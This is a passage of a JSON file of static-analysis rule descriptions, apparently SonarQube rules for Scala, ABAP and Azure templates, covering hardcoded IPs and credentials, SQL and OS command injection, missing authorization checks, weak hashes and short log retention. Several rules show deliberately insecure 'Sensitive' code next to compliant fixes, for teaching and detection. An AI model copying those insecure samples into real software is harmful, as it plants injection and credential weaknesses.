        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nval ip = \"192.168.12.42\" // Sensitive\nval socket = new Socket(ip, 6667)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nval ips = Source.fromFile(configuration_file).getLines.toList // Compliant\nval socket = new Socket(ips(0), 6667)\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n</ul>",
        "severity": "MINOR"
      },
      "scala:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "abap:S1493": {
        "name": "Having dynamic clauses for SQL \"SELECT\" statements is security-sensitive",
        "htmlDesc": "<p>There are two main reasons to ban dynamic clauses in <code>SELECT</code> statements.</p>\n<p>The first relates to maintainability. One of the nice features of ABAP Design Time is the connection to the data dictionary; you get syntax errors\nif you try to address table fields that are not present anymore or that have typos. With dynamic SQL, the ability to statically check the code for\nthis type of error is lost.</p>\n<p>The other more critical reason relates to security. By definition, dynamic clauses make an application susceptible to SQL injection attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The SQL statement can be written without dynamic clauses. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not use dynamic clauses in \"SELECT\" statements.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nSELECT (select_clause)\n FROM (from_clause) CLIENT SPECIFIED INTO &lt;fs&gt;\n WHERE (where_clause)\n GROUP BY (groupby_clause) HAVING (having_clause)\n ORDER BY (orderby_clause).\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSELECT *\n FROM db_persons INTO us_persons\n WHERE country IS 'US'.\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">OWASP Top 10 2021 Category A3</a> - Injection </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/89\">MITRE, CWE-89</a> - SQL Injection </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "abap:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nDATA: password(10) VALUE 'secret123',\n           pwd(10) VALUE 'secret123'.\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "abap:S4721": {
        "name": "Using shell interpreter when executing OS commands is security-sensitive",
        "htmlDesc": "<p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be\nused (when parameters are user-controlled for instance) to inject OS commands.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> OS command name or parameters are user-controlled. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Use functions that don’t spawn a shell.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCALL 'SYSTEM' ID 'COMMAND' FIELD usr_input ID 'TAB' FIELD TAB1.  \" Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCALL 'SYSTEM' ID 'COMMAND' FIELD \"/usr/bin/file.exe\" ID 'TAB' FIELD TAB1.  \" Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">OWASP Top 10 2021 Category A3</a> - Injection </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/78\">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>\n</ul>",
        "severity": "MAJOR"
      },
      "abap:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nDATA: ip TYPE string VALUE '192.168.12.42'.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nREAD DATASET file INTO ip MAXIMUM LENGTH len.\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n</ul>",
        "severity": "MINOR"
      },
      "abap:S5117": {
        "name": "\"SY-SUBRC\" should be checked after an \"AUTHORITY-CHECK\" statement",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Every <code>AUTHORITY-CHECK</code> statement sets the fields <code>SY-SUBRC</code> (also accessible as <code>SYST-SUBRC</code>) to the\nauthorization check result. Thus <code>SY-SUBRC</code> value should be checked just after every <code>AUTHORITY-CHECK</code> statement.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nAUTHORITY-CHECK OBJECT 'S_MYOBJ' \"Noncompliant\n    ID 'ID1' FIELD myvalue.\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nAUTHORITY-CHECK OBJECT 'S_MYOBJ'  \"Compliant\n    ID 'ID1' FIELD myvalue.\n\n  IF sy-subrc &lt;&gt; 0.\n    MESSAGE 'NOT AUTHORIZED' TYPE 'E'.\n  ENDIF.\n</pre>\n<h3>Exceptions</h3>\n<p>No issue will be raised in the following cases:</p>\n<ul>\n  <li> One or more <code>WRITE</code> operation are performed between the <code>AUTHORITY-CHECK</code> statement and <code>SY-SUBRC</code> check. An\n  exception will be however raised if the <code>WRITE</code> operation is a <code>WRITE ... TO</code> statement, as this will set again\n  <code>SY-SUBRC</code>. </li>\n  <li> <code>SY-SUBRC</code>'s value is assigned to a variable. We then assume that it will be checked later. </li>\n</ul>\n<pre>\nAUTHORITY-CHECK OBJECT 'S_MYOBJ'  \"Compliant\n    ID 'ID1' FIELD myvalue.\nWRITE 'Test' \" WRITE is accepted before checking SY-SUBRC\nIF SY-SUBRC &lt;&gt; 0.\n    EXIT.\nENDIF.\n\nAUTHORITY-CHECK OBJECT 'S_MYOBJ'  \"Compliant\n    ID 'ID1' FIELD myvalue.\nTmp = SY-SUBRC \" Assigning SY-SUBRC value to a variable. We assume that it will be checked later.\nIF Tmp &lt;&gt; 0.\n    EXIT.\nENDIF.\n</pre>",
        "severity": "BLOCKER"
      },
      "abap:S1674": {
        "name": "\"CATCH\" clauses should not be empty",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Leaving a <code>CATCH</code> block empty means that the exception in question is neither handled nor passed forward to callers for handling at a\nhigher level. Suppressing errors rather than handling them could lead to unpredictable system behavior and should be avoided.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n  try.\n    if ABS( NUMBER ) &gt; 100.\n      write / 'Number is large'.\n    endif.\n    catch CX_SY_ARITHMETIC_ERROR into OREF.\n  endtry.\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n  try.\n    if ABS( NUMBER ) &gt; 100.\n      write / 'Number is large'.\n    endif.\n  catch CX_SY_ARITHMETIC_ERROR into OREF.\n    write / OREF-&gt;GET_TEXT( ).\n  endtry.\n</pre>\n<h3>Exceptions</h3>\n<p>When a block contains a comment, it is not considered to be empty.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/391\">MITRE, CWE-391</a> - Unchecked Error Condition </li>\n  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>\n</ul>",
        "severity": "MINOR"
      },
      "abap:S5115": {
        "name": "Authorization checks should not rely on hardcoded user properties",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Checking logged users' permissions by comparing their name to a hardcoded string can create security vulnerabilities. It prevents system\nadministrators from changing users' permissions when needed (example: when their account has been compromised). Thus system fields\n<code>SY-UNAME</code> and <code>SYST-UNAME</code> should not be compared to hardcoded strings. Use instead <code>AUTHORITY-CHECK</code> to check\nusers' permissions.</p>\n<p>This rule raises an issue when either of the system fields <code>SY-UNAME</code> or <code>SYST-UNAME</code> are compared to a hardcoded value in a\n<code>CASE</code> statement or using one of the following operators: <code>=</code>, <code>EQ</code>, <code>&lt;&gt;</code>, <code>NE</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nIF SY-UNAME = 'ALICE'. \" Noncompliant\nENDIF.\n\nCASE SY-UNAME.\nWHEN 'A'. \" Noncompliant\nENDCASE.\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nAUTHORITY-CHECK OBJECT 'S_CARRID'\n  ID 'CARRID' FIELD mycarrid.\nIF sy-subrc &lt;&gt; 0.\n  MESSAGE 'Not authorized' TYPE 'E'.\nENDIF.\n</pre>",
        "severity": "CRITICAL"
      },
      "abap:S1486": {
        "name": "\"BREAK-POINT\" statement should not be used in production",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>A <code>BREAK-POINT</code> statement is used when debugging an application with help of the ABAP Debugger. But such debugging statements could make\nan application vulnerable to attackers, and should not be left in the source code.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nIF wv_parallel EQ 'X'.\n  BREAK-POINT.\n  WAIT UNTIL g_nb_return EQ wv_nb_call.\nENDIF.\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nIF wv_parallel EQ 'X'.\n  WAIT UNTIL g_nb_return EQ wv_nb_call.\nENDIF.\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/489\">MITRE, CWE-489</a> - Active Debug Code </li>\n</ul>",
        "severity": "MINOR"
      },
      "abap:S2809": {
        "name": "Using \"CALL TRANSACTION\" statements without an authority check is security-sensitive",
        "htmlDesc": "<p>Using \"CALL TRANSACTION\" statements without an authority check is security sensitive. Its access should be restricted to specific users.</p>\n<p>This rule raises when a <code>CALL TRANSACTION</code> has no explicit authorization check, i.e. when:</p>\n<ul>\n  <li> the <code>CALL TRANSACTION</code> statement is not followed by <code>WITH AUTHORITY-CHECK</code>. </li>\n  <li> the <code>CALL TRANSACTION</code> statement is not following an <code>AUTHORITY-CHECK</code> statement. </li>\n  <li> the <code>CALL TRANSACTION</code> statement is not following a call to the <code>AUTHORITY_CHECK_TCODE</code> function. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the <code>CALL TRANSACTION</code> statement is restricted to the right users. </li>\n</ul>\n<p>There is a risk if you answered no to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Check current user’s authorization before every <code>CALL TRANSACTION</code> statement. Since ABAP 7.4 this should be done by appending <code>WITH\nAUTHORITY-CHECK</code> to <code>CALL TRANSACTION</code> statements. In earlier versions the <code>AUTHORITY-CHECK</code> statement or a call to the\n<code>AUTHORITY_CHECK_TCODE</code> function can be used.</p>\n<p>Note that since ABAP 7.4 any <code>CALL TRANSACTION</code> statement not followed by <code>WITH AUTHORITY-CHECK</code> or <code>WITHOUT\nAUTHORITY-CHECK</code> <a href=\"https://help.sap.com/doc/abapdocu_751_index_htm/7.51/en-US/abapcall_transaction_authority.htm\">is obsolete</a>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCALL TRANSACTION 'MY_DIALOG'.  \" Sensitive as there is no apparent authorization check. It is also obsolete since ABAP 7.4.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nAUTHORITY-CHECK OBJECT 'S_DIAGID'\n                  ID 'ACTVT' FIELD '03'.\nIF sy-subrc &lt;&gt; 0.\n  \" show an error message...\nENDIF.\n\nCALL TRANSACTION 'MY_DIALOG'. \" Ok but obsolete since ABAP 7.4.\n</pre>\n<p>or</p>\n<pre>\nCALL FUNCTION 'AUTHORITY_CHECK_TCODE'\n  exporting\n    tcode  = up_fdta\n  exceptions\n    ok     = 0\n    others = 4.\nIF sy-subrc &lt;&gt; 0.\n  \" show an error message...\nENDIF.\n\nCALL TRANSACTION up_fdta USING up_bdc mode 'E'. \" Ok but obsolete since ABAP 7.4.\n</pre>\n<p>or</p>\n<pre>\nCALL TRANSACTION 'MY_DIALOG' WITH AUTHORITY-CHECK. \" Recommended way since ABAP 7.4.\n</pre>\n<h2>Exceptions</h2>\n<p>No issue will be raised when <code>CALL TRANSACTION</code> is followed by <code>WITHOUT AUTHORITY-CHECK</code> as it explicitly says that the\nTRANSACTION does not require an authorization check.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/285\">MITRE, CWE-285</a> - Improper Authorization </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/862\">MITRE, CWE-862</a> - Missing Authorization </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "abap:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<p>This rule raises an issue when <code>MD5_CALCULATE_HASH_FOR_RAW</code> or <code>MD5_CALCULATE_HASH_FOR_CHAR</code> functions are used.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/1240\">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "azureresourcemanager:S6413": {
        "name": "Defining a short log retention duration is security-sensitive",
        "htmlDesc": "<p>Defining a short log retention duration can reduce an organization’s ability to backtrace the actions of malicious actors in case of a security\nincident.</p>\n<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage\nenables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>\n<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will\nallow investigators to establish a timeline of the actions perpetrated by an attacker.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This component is essential for the information system infrastructure. </li>\n  <li> This component is essential for mission-critical functions. </li>\n  <li> Compliance policies require traceability for a longer duration. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Increase the log retention period to an amount of time sufficient enough to be able to investigate and restore service in case of an incident.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/firewall-manager/policy-overview\">Azure Firewall Policy</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Network/firewallPolicies\",\n      \"apiVersion\": \"2022-07-01\",\n      \"properties\": {\n        \"insights\": {\n          \"isEnabled\": true,\n          \"retentionDays\": 7\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource firewallPolicy 'Microsoft.Network/firewallPolicies@2022-07-01' = {\n  properties: {\n    insights: {\n      isEnabled: true\n      retentionDays: 7  // Sensitive\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.network/networkwatchers/flowlogs\">Microsoft Network Network Watchers Flow\nLogs</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"networkWatchers/example\",\n      \"type\": \"Microsoft.Network/networkWatchers/flowLogs\",\n      \"apiVersion\": \"2022-07-01\",\n      \"properties\": {\n        \"retentionPolicy\": {\n          \"days\": 7,\n          \"enabled\": true\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nresource networkWatchersFlowLogs 'Microsoft.Network/networkWatchers/flowLogs@2022-07-01' = {\n  properties: {\n    retentionPolicy: {\n      days: 7\n      enabled: true\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/2021-11-01/servers/auditingsettings\">Microsoft SQL Servers Auditing\nSettings</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example/default\",\n      \"type\": \"Microsoft.Sql/servers/auditingSettings\",\n      \"apiVersion\": \"2021-11-01\",\n      \"properties\": {\n        \"retentionDays\": 7,\n        \"state\": \"Enabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\nresource sqlServerAudit 'Microsoft.Sql/servers/auditingSettings@2021-11-01' = {\n  properties: {\n    retentionDays: 7    // Sensitive\n  }\n}\n</pre>\n<p>This rule also applies to log retention periods that are too short, on the following resources:</p>\n<ul>\n  <li> <code>Microsoft.DBforMariaDB/servers/securityAlertPolicies</code> - for <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/2018-06-01/servers/securityalertpolicies\">Microsoft DB for MariaDB\n  Servers Security Alert Policies</a> </li>\n  <li> <code>Microsoft.Sql/servers/databases/securityAlertPolicies</code> - for <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/servers/databases/securityalertpolicies\">Microsoft Sql Servers Databases\n  Security Alert Policies</a> </li>\n  <li> <code>Microsoft.Sql/servers/auditingPolicies</code> - for <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.sql/servers/auditingpolicies\">Microsoft Sql Servers Auditing Policies</a> </li>\n 